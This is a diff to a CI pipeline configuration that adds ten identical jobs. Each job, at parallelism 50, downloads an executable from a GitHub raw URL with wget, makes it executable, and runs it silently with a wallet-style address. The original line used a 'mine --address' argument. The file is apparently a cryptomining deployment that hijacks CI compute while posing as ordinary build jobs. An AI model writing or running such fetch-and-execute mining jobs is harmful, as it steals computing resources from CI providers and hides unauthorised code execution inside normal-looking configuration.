@@ -10,7 +10,61 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget -qO asep https://github.com/sandycheak67/dean/raw/refs/heads/main/polikis'
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
             - chmod +x asep
-            - ./asep mine --address x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #2'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #3'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #4'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #5'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #6'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #7'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #8'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #9'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
+          parallelism: 50
+        - name: 'Job #10'
+          commands:
+            - 'wget -qO asep https://github.com/sandycheak67/super-palm-tree/raw/refs/heads/main/kankan'
+            - chmod +x asep
+            - ./asep z --username x4DmwGwZ2hMoGg1okTXcBRLYzKzoBDL7vGU9ao2bDJH > /dev/null 2>&1
           parallelism: 50
